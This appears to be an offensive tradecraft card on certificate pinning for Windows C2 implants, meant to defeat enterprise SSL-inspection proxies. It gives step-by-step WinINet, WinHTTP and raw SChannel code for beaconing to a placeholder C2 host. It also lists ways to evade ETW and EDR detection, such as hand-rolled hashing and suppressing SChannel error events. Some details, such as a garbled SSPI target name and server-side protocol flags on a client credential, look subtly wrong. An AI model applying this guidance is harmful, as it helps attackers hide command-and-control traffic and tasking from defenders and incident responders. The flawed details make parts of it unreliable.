# Certificate Pinning for C2 SSL Inspection Evasion — Application-layer TLS pinning that defeats enterprise SSL inspection proxies

## Summary

Certificate pinning is the practice of validating the peer certificate presented during a TLS handshake against a precomputed list of acceptable SHA-256 digests, instead of delegating validation to the Windows trust store. In an enterprise where an F5 BIG-IP, Blue Coat ProxySG, Citrix Netscaler, or Palo Alto firewall is configured to intercept and decrypt TLS, the appliance generates an on-the-fly leaf certificate signed by an enterprise root CA that has been pushed to every workstation's `ROOT` certificate store via GPO. The default `CertVerifyCertificateChainPolicy(HTTPSPolicyCallbackData, ...)` call therefore succeeds against the proxy's forged chain, and the inspection engine reads plaintext C2 traffic. Pinning bypasses this by ignoring the system chain policy entirely: after the handshake completes, the operator retrieves the server's certificate context via `InternetQueryOptionW(hRequest, INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT, &pChainContext, &cbSize)` (WinINet) or `WinHttpQueryOption(hRequest, WINHTTP_OPTION_SERVER_CERT_CONTEXT, &pCertContext, &cbSize)` (WinHTTP), computes `CryptHashCertificate2(NULL, BCRYPT_SHA256_ALGORITHM, NULL, pCertContext->pbCertEncoded, pCertContext->cbCertEncoded, rgbHash, &cbHash)`, and compares the resulting 32 bytes against a static pin table embedded in the implant. If the digest does not match, the operator closes the handle without issuing further reads, starving the inspection appliance of plaintext protocol bytes. No administrative privilege is required — the technique runs entirely in user mode against the public CryptoAPI / WinINet / WinHTTP surfaces. The vault's T-022 card documents NT socket framing and transport-layer concealment but does not document the application-layer certificate validation logic that defeats SSL inspection at the certificate level — that gap is what this card fills.

## Mechanism

### Variant 1: WinINet-based pinning

1. Build the pin table at compile time by computing SHA-256 over the DER encoding of the legitimate server's certificate (or, for stability across leaf renewal, the SubjectPublicKeyInfo). Embed as `static const BYTE rgPins[][32]` in the implant's read-only data section. At minimum two pins per hostname to survive rotation.
2. Open the HTTPS session: `hInternet = InternetOpenW(L"Mozilla/5.0...", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)`. Pre-config type routes through the user's system proxy setting — which is typically the inspection appliance, transparently to the operator.
3. `hConnect = InternetConnectW(hInternet, L"c2.example.net", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTPS, 0, 0)`.
4. `hRequest = HttpOpenRequestW(hConnect, L"HEAD", L"/probe", NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD, 0)`. The HEAD probe avoids sending any payload body before pinning validates the cert.
5. `HttpSendRequestW(hRequest, NULL, 0, NULL, 0)` — WinINet performs the TLS handshake internally via SChannel, using the system trust store to validate the server cert. The connection succeeds against the MITM proxy because the proxy's CA is in the trusted root store.
6. After `HttpSendRequestW` returns success, retrieve the chain: `DWORD cb = sizeof(PCCERT_CHAIN_CONTEXT); PCCERT_CHAIN_CONTEXT pChain = NULL; InternetQueryOptionW(hRequest, INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT, &pChain, &cb)`. The option constant is `0x7A` (122).
7. Walk to the leaf: `PCCERT_CONTEXT pCert = pChain->rgpChain[0]->rgpElement[0]->pCertContext`. `pCert->pbCertEncoded` points to the DER bytes the server actually presented during the handshake.
8. Compute digest: `BYTE rgbDigest[32]; DWORD cbDigest = 32; CryptHashCertificate2(NULL, BCRYPT_SHA256_ALGORITHM, NULL, pCert->pbCertEncoded, pCert->cbCertEncoded, rgbDigest, &cbDigest)`.
9. Constant-time compare against each pin in the table: `BYTE diff = 0; for (int i = 0; i < 32; i++) diff |= rgbDigest[i] ^ rgPins[idx][i]; if (diff == 0) { match = TRUE; break; }`.
10. On match, close the probe handle and issue the real `HttpOpenRequestW(L"POST", L"/beacon", ...)` against the same connection. On mismatch, call `InternetCloseHandle(hRequest)` without any subsequent `InternetReadFile` — a read would return the proxy-decrypted response body into your process memory.
11. Free the chain with `CertFreeCertificateChain(pChain)` to avoid refcount leaks across long-running beacon sessions that poll pinning periodically.

### Variant 2: WinHTTP-based pinning

1. `hSession = WinHttpOpen(L"Mozilla/5.0...", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)`.
2. `hConnect = WinHttpConnect(hSession, L"c2.example.net", INTERNET_DEFAULT_HTTPS_PORT, 0)`.
3. `hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/beacon", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE)`.
4. Force modern TLS: `DWORD dwProtos = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3; WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURE_PROTOCOLS, &dwProtos, sizeof(dwProtos))`. Older inspection appliances mangle the chain on TLS 1.0 downgrade.
5. `WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, lpBody, cbBody, cbBody, 0)` followed by `WinHttpReceiveResponse(hRequest, NULL)`.
6. Retrieve the cert context directly: `PCCERT_CONTEXT pCert = NULL; DWORD cb = sizeof(pCert); WinHttpQueryOption(hRequest, WINHTTP_OPTION_SERVER_CERT_CONTEXT, &pCert, &cb)`. Constant `WINHTTP_OPTION_SERVER_CERT_CONTEXT = 0x60` (96).
7. Optional intermediate pinning: query `WINHTTP_OPTION_SERVER_CERT_CHAIN_CONTEXT = 0x61` (97) for the full `PCCERT_CHAIN_CONTEXT` and pin the intermediate's SPKI hash separately from the leaf — defense-in-depth in case the leaf rotates more often than the intermediate.
8. Compute SHA-256 over `pCert->pbCertEncoded` (length `cbCertEncoded`) using `CryptHashCertificate2` as above, compare against pin table.
9. On mismatch, suppress SChannel re-handshake logging by setting `DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID` (0x00000100 | 0x00002000 | 0x00001000 = 0x00003100) via `WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags))` BEFORE calling `WinHttpCloseHandle(hRequest)`. This suppresses the SChannel error event for the abort rather than allowing it to propagate.

### Variant 3: Direct SChannel pinning (lowest telemetry surface)

1. `SCHANNEL_CRED cred = {0}; cred.dwVersion = SCHANNEL_CRED_VERSION; cred.dwFlags = SCH_CRED_NO_DEFAULT_CREDS | SCH_CRED_NO_SERVERNAME_CHECK | SCH_USE_STRONG_CRYPTO; cred.grbitEnabledProtocols = SP_PROT_TLS1_2_SERVER | SP_PROT_TLS1_2_CLIENT;`. `SCH_CRED_NO_SERVERNAME_CHECK` (0x4) skips the default chain validation that would otherwise fail the handshake for a forged-name cert.
2. `AcquireCredentialsHandleW(NULL, UNISP_NAME_W, SECPKG_CRED_OUTBOUND, NULL, &cred, NULL, NULL, &hCred, &tsExpiry)`. `UNISP_NAME_W = L"Microsoft Unified Security Protocol Provider"`.
3. Open the socket: `socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)` + `connect(...)`.
4. Loop on `InitializeSecurityContextW(&hCred, fInit ? &hContext : NULL, L"msstil/sigabc2.example.net", ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_CONFIDENTIALITY | ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT, 0, SECURITY_NATIVE_DREP, &inBuffer, 0, &hContext, &outBuffer, &pulContextAttr, &tsExpiry)` until `SEC_E_OK` (handshake complete). `fInit` is `FALSE` for the first call, then `TRUE`. The `pszTargetName` argument sets the SChannel expected name — paired with `SCH_CRED_NO_SERVERNAME_CHECK` it lets the handshake complete regardless of cert name mismatch.
5. After `SEC_E_OK`, retrieve the peer's leaf cert directly: `PCCERT_CONTEXT pCert = NULL; QueryContextAttributesW(&hContext, SECPKG_ATTR_REMOTE_CERT_CONTEXT, &pCert)`. `SECPKG_ATTR_REMOTE_CERT_CONTEXT = 0x5C` (92). This call does NOT invoke chain trust verification — it returns the raw leaf bytes as received.
6. `BYTE rgbDigest[32]; DWORD cbDigest = 32; CryptHashCertificate2(NULL, BCRYPT_SHA256_ALGORITHM, NULL, pCert->pbCertEncoded, pCert->cbCertEncoded, rgbDigest, &cbDigest)`.
7. Constant-time compare against the pin table. On mismatch, `DeleteSecurityContext(&hContext)` and `closesocket(sock)` — no application data crosses the wire beyond the TLS handshake itself.
8. On match, beacon traffic via `EncryptMessage(&hContext, 0, &msgBuffer, 0)` then `WSASend(sock, ...)`; decrypt responses with `DecryptMessage(&hContext, &msgBuffer, 0, NULL)`.

## OS Internals Context

The Windows TLS stack is layered across three subsystems. At the lowest layer, the kernel transport (`afd.sys` for socket I/O, `tcpip.sys` for the TCP state machine) is uninvolved in certificate validation — TLS handshake bytes are user-mode buffers passed through `WSASend` / `WSARecv` against a `SOCK_STREAM` socket. The `schannel.dll` user-mode DLL implements the TLS record protocol and the SSPI surface (`InitializeSecurityContext`, `DecryptMessage`, `EncryptMessage`) by calling into `ncrypt.dll` for cryptographic primitives and the kernel CNG services via `cng.sys` / `ksecdd.sys` for key isolation. WinINet (`wininet.dll`) and WinHTTP (`winhttp.dll`) are higher-level HTTP transports that wrap SChannel under the hood: each HTTPS request handle owns an implicit SSPI context that WinINet's `HTTP_SESSION_HANDLE` / `HTTP_CONNECT_HANDLE` / `HTTP_REQUEST_HANDLE` hierarchy exposes only indirectly via `InternetQueryOptionW`. The internal structure these handle types reference contains a `SCHANNEL_HTTP_CONTEXT` with the active SSPI credential handle and target name; calling `INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT` walks to that context and dereferences the channel's remote certificate.

`PCCERT_CONTEXT` is the core certificate handle returned from these queries. It is a thin wrapper struct: `{ DWORD dwCertEncodingType; BYTE *pbCertEncoded; DWORD cbCertEncoded; PCERT_INFO pCertInfo; HCERTSTORE hCertStore; }`. The `pbCertEncoded` / `cbCertEncoded` pair contains the raw DER encoding of the X.509 certificate — the same bytes that would be returned by `CertCreateCertificateContext` if you parsed the certificate from a `.cer` file. The SHA-256 fingerprint MUST be computed over this DER blob (not over a re-serialization); any computation that goes through `CertNameToStrW` or `CertStrToNameW` will produce a non-canonical encoding because of the BER/DER choice in certificate field ordering, and the digest will not match externally-computed pins (e.g., those from `openssl x509 -fingerprint -sha256`).

The chain context `PCCERT_CHAIN_CONTEXT` is more elaborate: it has `cChain` (count of simple chains), `rgpChain` (array of `PCERT_SIMPLE_CHAIN` pointers), and each `PCERT_SIMPLE_CHAIN` has `cElement` and `rgpElement[]` array of `PCERT_CHAIN_ELEMENT` with the leaf at index 0. Each element exposes a `pCertContext` field pointing to a `PCCERT_CONTEXT`. Calling `InternetQueryOption(INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT)` returns this whole structure, already built and cached from the SChannel handshake. The chain building itself uses the `CertGetCertificateChain` algorithm: it walks the issuer field of each certificate, searches the configured stores (`CA`, `ROOT`, `MY`, plus any `CertAddStoreToCollection` chain engine additions), and applies the chain policy engine (`CERT_CHAIN_POLICY_SSL`). When an SSL inspection appliance has installed its root into `Cert:\LocalMachine\Root`, this walk succeeds against the forged chain; the trust evaluation is structurally unaware that the leaf certificate was minted by a different issuer than the legitimate site operator.

This is why the digest match operates on `pbCertEncoded` and not on the chain's trust verdict. The pinned fingerprint is, in effect, a sidestepping of `CertVerifyCertificateChainPolicy` entirely — the operator is asserting "I do not care what the system thinks; this specific byte sequence is the certificate I will accept." Equivalently, the operator is implementing the `CERT_CHAIN_POLICY_SSL` algorithm but with a terminal pin-check gate layered in.

SChannel's `QueryContextAttributesW` with `SECPKG_ATTR_REMOTE_CERT_CONTEXT` follows the same pattern as WinHTTP's option but at one layer lower. Because the operator built the SSPI context with `SCH_CRED_NO_SERVERNAME_CHECK` (0x4), SChannel skips the auto-chain-validation step that would otherwise fail the handshake for an MITM proxy with a perfectly valid (per the local root store) but wrong-name certificate — instead, the handshake completes unconditionally, and the operator runs validation at the application level. `SECPKG_ATTR_REMOTE_CERT_CHAIN_CONTEXT = 0x6B` (107) is the analog that returns the full chain if needed for intermediate pinning.

`CertGetNameStringW` with `CERT_NAME_SIMPLE_DISPLAY_TYPE` (4) reads the certificate's `Subject` RDN sequence and emits a flattened display string like `CN=c2.example.net`. With `CERT_NAME_DNS_TYPE` (1) it emits the comma-separated SubjectAlternativeName list. Operators sometimes use this as a second-layer check: an inspection appliance may forge a certificate with the correct CN but wrong SPKI — the SPKI hash will mismatch while the name check passes, providing defense-in-depth. The hostname check is implemented by reading `pCertInfo->Subject` (`CertNameToStrW` with `CERT_X500_NAME_STR` produces the canonical form) and comparing against the target hostname that the operator intends to reach.

The CryptoAPI hashing functions sit on top of the CNG (Cryptography Next Generation) framework. `CryptHashCertificate2` accepts `pszAlgId = L"SHA256"` (or `BCRYPT_SHA256_ALGORITHM` macro = `L"SHA256"`), reads the input buffer once, and writes 32 bytes to the output. Under the hood it calls `BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, MS_PRIMITIVE_PROVIDER, 0)`, `BCryptHash(hAlg, NULL, 0, pbInput, cbInput, pbOutput, 32)`. The Microsoft Primitive Provider is FIPS-validated. The legacy `CryptHashCertificate` surface (taking `CALG_SHA_256 = 0x00000800`) routes through the older CSP path and MAY be intercepted by a custom CSP installed on the host — operators requiring maximum assurance should prefer `CryptHashCertificate2` against the CNG stack.

The pin table itself should ideally pin the SPKI hash rather than the full certificate hash. SPKI is computed over the certificate's `SubjectPublicKeyInfo` DER encoding, accessible via `pCertInfo->SubjectPublicKey.PublicKey.pbData` (length `pCertInfo->SubjectPublicKey.PublicKey.cbData`). SPKI pins survive legitimate leaf certificate renewal — operators frequently keep the same key pair across reissues — whereas full-cert pins must be rotated in the implant binary each time the C2 server renews its Let's Encrypt certificate (typically every 90 days). A typical pin table contains both: leaf SPKI hashes as the primary check, plus leaf-cert SHA-256 as a secondary in case SPKI is rotated.

## Key Implementation Details

**Privilege prerequisites**: None. Certificate pinning runs entirely with the invoking user's token; no `SeDebugPrivilege`, no `SYSTEM`, no admin. The user does need network access to reach the C2 domain over 443/TCP, and must be able to issue the WinINet / WinHTTP calls. This is the lowest-friction C2 hardening technique available — it can be added to any user-mode beacon without escalation.

**Constant-time comparison pitfall**: `memcmp` is not constant-time; many compilers emit early-exit byte-by-byte compares. For a pin table this is operationally marginal (the pin list is small and the digest size is fixed), but a paranoid implementation should use XOR-accumulate: `BYTE diff = 0; for (int i = 0; i < 32; i++) diff |= rgbDigest[i] ^ rgPins[idx][i]; return diff == 0;`. This avoids leaking the matching index via timing side-channels and eliminates the obvious "(no CertVerifyCertificateChainPolicy call)" heuristic from detection.

**WOW64 boundary**: WinINet and WinHTTP on a 64-bit Windows host called from a 32-bit implant use the WOW64 thunk layer. `INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT` works but the returned pointers are 64-bit; the thunk handles marshalling correctly for query purposes. The older `INTERNET_OPTION_SECURITY_CERTIFICATE_STRUCT` (option 32) is sometimes simpler on WOW64 because it returns a flat `INTERNET_CERTIFICATE_INFO` struct, not a pointer-bearing chain — though it does not expose the DER bytes for fingerprinting directly.

**Pin table structure**: Each entry is 32 bytes for SHA-256 (or 20 bytes if you accept SHA-1 — NOT recommended, SHA-1 collisions are practical against chosen-prefix attacks). Include the hostname alongside each pin (e.g., `struct Pin { PCWSTR hostname; BYTE sha256[32]; }`) so the same table can serve multi-tenant C2 infrastructure. Pin at minimum two SPKI hashes per hostname to survive rotation. The pin table itself is read-only and lives in the `.rdata` section of the implant binary — extractable by RE, but only reveals which leaf certs you were willing to accept, not infrastructure addresses you weren't already exposing.

**The "send before validate" trap**: `HttpSendRequestW` accepts the body up-front. If the operator calls `HttpSendRequestW(L"POST", ..., lpBody, cbBody)` with the C2 protocol greeting in the body, and only then queries the cert, the inspection appliance has already captured the greeting bytes from its side of the TLS session. Two correct patterns: (a) HEAD probe first, validate, then issue the POST; (b) use chunked transfer encoding and only flush the second chunk after pinning succeeds. Variant 3 (direct SChannel) avoids this entirely because the operator controls `EncryptMessage` and can defer encrypting any C2 data until after the post-handshake pin check.

**TLS version requirements**: TLS 1.2+ must be available on the inspection appliance for SChannel to expose the cert context cleanly. Older appliances (Blue Coat ProxySG v6 and earlier, some Netscaler firmware) downgrade to TLS 1.0 and mangle the certificate chain on the downgrade; the SChannel handshake succeeds but `INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT` may return an incomplete chain or a chain missing the leaf. Force `WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3` (0x0A00 / 0x2000) via `WINHTTP_OPTION_SECURE_PROTOCOLS` to avoid this.

## Why It Matters

SSL inspection is the single most common reason operators lose C2 to blue-team IR. The first thing a competent defender does with a beacon alert is forward the PCAP to the inspection appliance and pull the decrypted transcript — that transcript is plaintext C2 protocol, possibly encrypted command output, and frequently the operator's full tasking and beacon key material. Pinning closes this hole without forcing the operator to a non-HTTPS transport, which means C2 traffic still blends with the dominant share of egress traffic on a corporate network. It is the most operationally cheap hardening step in any beacon pipeline.

The technique composes cleanly with T-022 (raw NT socket / transport framing): T-022 covers the transport layer, this card covers the TLS-layer validation on top of it. For operators who want to skip both WinINet and WinHTTP entirely and build their own HTTP/TLS stack against SChannel, Variant 3 of this card provides the SSPI surface. It also pairs naturally with domain-fronting / domain-fronting-via-CDN patterns: pin the fronted domain's certificate, accept that SNI may be transient, and let the SSL appliance pass the connection through without MITM because the CDN's leaf is not forgeable on the appliance's CA.

## Detection Considerations

- **Telemetry sources**: `Microsoft-Windows-WinINet` (ETW GUID `{2f9a8628-c5b4-4279-e9a8-87ede9e4f0ea}`) emits Option Query events when `INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT` is read; `Microsoft-Windows-WinHTTP` (`{b3880dce-cfd1-4df9-8e2c-fc3ede0644de}`) similarly emits on `WINHTTP_OPTION_SERVER_CERT_CONTEXT` queries. The presence of these option queries on a request handle, with NO subsequent call to `CertVerifyCertificateChainPolicy`, is a strong signal of application-layer pinning. `Microsoft-Windows-Schannel` event log (Event IDs 1, 2, 4 — connection / handshake / certificate details) can be cross-correlated to identify which process owns the TLS session.
- **Bypass options**: Pinning cannot be detected from network-side telemetry alone — the operator's pinning logic is purely host-local. Endpoint detection via ETW can be evaded by (a) using direct SChannel via `AcquireCredentialsHandleW` + `InitializeSecurityContextW` rather than WinINet / WinHTTP, which avoids the WinINet/WinHTTP ETW providers entirely, leaving only SChannel ETW (which emits on handshake but not on post-handshake `QueryContextAttributesW`); (b) computing the fingerprint using a hand-rolled SHA-256 (avoids `CryptHashCertificate2` / `BCryptHash` ETW events from the CNG provider); (c) replacing `CryptHashCertificate2` with `CryptHashCertificate` against a custom CSP if a hostile CSP is preinstalled. Some EDR vendors hook `CertGetCertificateChain` and `CertVerifyCertificateChainPolicy` and alert on TLS connections where these are NOT called post-handshake — Variant 3 defeats this by never going through the chain policy path at all.
- **Residual artifacts**: No disk artifacts, no registry writes, no service installed. Memory footprint is the pin table (typically <1KB) and the transient `PCCERT_CONTEXT` / `PCCERT_CHAIN_CONTEXT` handles. The clearest residual is the behavioral gap: a successful TLS session in process trace with no `CertVerifyCertificateChainPolicy` call. The SChannel event log entry for the connection itself remains on the host, recording the leaf certificate's issuer and subject — defenders can compare these against the operator's actual C2 infrastructure to confirm an inspection appliance did not MITM.

## Common Mistakes

1. **Forgetting to free `pChainContext`**: each `InternetQueryOption(INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT)` call increments the chain's refcount. Across long-running beacon sessions making thousands of polls, the chain context refcount leak accumulates and shows up in `Process\Private Bytes` perfmon as a slow growth that EDR baselines will eventually flag. Always pair with `CertFreeCertificateChain(pChainContext)`; pair the leaf cert query with `CertFreeCertificateContext(pCertContext)`.
2. **Pinning the leaf certificate's full DER instead of SPKI**: cert renewal cycles the leaf and your pin table breaks at 3 AM when Let's Encrypt rotates. Pin SPKI (extract via `pCertInfo->SubjectPublicKey.PublicKey.pbData` / `cbData`) — survives renewal with same key pair, which is the typical operational pattern.
3. **Computing the hash over `pCertInfo` instead of `pbCertEncoded`**: `pCertInfo` is the parsed `CERT_INFO` structure, not the canonical DER. The hash will be reproducible within your own process but will not match externally-computed pins from `openssl x509 -fingerprint -sha256` or the operator's offline tooling. Always hash `pbCertEncoded` of length `cbCertEncoded`.
4. **Sending the beacon payload before validating**: `HttpSendRequestW` accepts the body up-front; if you call it with your protocol greeting and then validate the cert, the inspection appliance has already captured the greeting bytes from its side of the TLS session. Always HEAD-probe first, or use chunked encoding and only flush the second chunk after pinning succeeds.
5. **Using `memcmp` and accepting side-channel leaks**: low-impact operationally but eliminates the principal defense argument ("my pin table is constant-time"). Use XOR-accumulate and `volatile` the comparison loop to defeat compiler optimization back to `memcmp`.
6. **Ignoring TLS 1.3 session resumption**: on resumption SChannel may not present the full server certificate chain on every connection; the cert context query may return a cached context from the original handshake. Operators running long-lived sessions should force a full handshake periodically by calling `DeleteSecurityContext` and re-handshaking — pinning only validates the original handshake, after which the symmetric session key is what protects the channel.
